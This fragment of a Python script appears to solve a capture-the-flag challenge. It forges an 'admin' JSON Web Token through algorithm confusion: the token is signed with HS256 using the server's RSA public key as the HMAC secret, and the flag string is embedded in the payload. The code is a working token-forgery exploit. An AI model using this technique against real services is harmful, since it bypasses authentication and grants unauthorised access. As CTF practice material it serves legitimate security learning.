...
def create_jwt_signature(header, payload, rsa_public_key):
    # Encode the header and payload
    encoded_header = base64.urlsafe_b64encode(bytes(str(header), 'utf-8')).decode().replace("=", "")
    encoded_payload = base64.urlsafe_b64encode(bytes(str(payload), 'utf-8')).decode().replace("=", "")

    print(encoded_header, encoded_payload)
    signing_input = encoded_header + '.' + encoded_payload
    hmac_signature = hmac.new(rsa_public_key, bytes(signing_input, 'utf-8'), digestmod='sha256').digest()
    encoded_signature = base64.urlsafe_b64encode(bytes(hmac_signature)).decode().replace("=", "")
...
payload = '{"username":"admin","flag1":"CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}","exp":1686583759}'
pem_to_jwk = JWK.from_pem(to_bytes_2and3(pub_pem))

key = bytes(open("rsa-public-key.pem","r").read(), "utf-8")
key = serialization.load_pem_public_key(pub_pem) 
# jwt_token = create_jwt_signature(header, payload, key)
print(key)
jwt_token = jwt.encode({"username":"admin","flag1":"CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}","exp":1686583759}, key, algorithm="HS256")
print(jwt_token)
'''
...
Create Signature
'''
with open('rsa-public-key.pem', 'rb') as f:
    key = f.read()
header = '{"alg": "HS256", "typ": "JWT"}'
payload = '{"username":"admin","flag1":"CNS{JW7_15_N07_a_900d_PLACE_70_H1DE_5ecrE75}","exp":1686583759}'
